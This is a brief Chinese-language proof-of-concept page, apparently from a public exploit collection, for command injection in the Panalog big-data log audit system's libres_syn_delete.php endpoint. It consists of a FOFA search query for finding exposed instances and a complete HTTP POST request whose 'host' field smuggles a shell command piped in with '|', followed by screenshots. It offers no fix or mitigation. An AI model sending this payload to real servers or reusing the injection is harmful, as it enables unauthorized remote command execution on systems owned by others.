## Panalog大数据日志审计系统libres_syn_delete.php存在命令执行


## fofa
```
app="Panabit-Panalog"
```

## poc
```
POST /content-apply/libres_syn_delete.php HTTP/1.1
Host: 
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Content-Length: 54
Accept: */*
Accept-Encoding: gzip, deflate
Connection: close
Content-Type: application/x-www-form-urlencoded

token=1&id=2&host=|id >2cWKiiWovWYAIcNUBPkZph4xPLs.txt
```
![image](https://github.com/wy876/POC/assets/139549762/44588f4b-2c3a-45c6-bc27-951795c2d64b)

![image](https://github.com/wy876/POC/assets/139549762/90d69ec6-1058-4563-b02f-0721a1c68e8f)
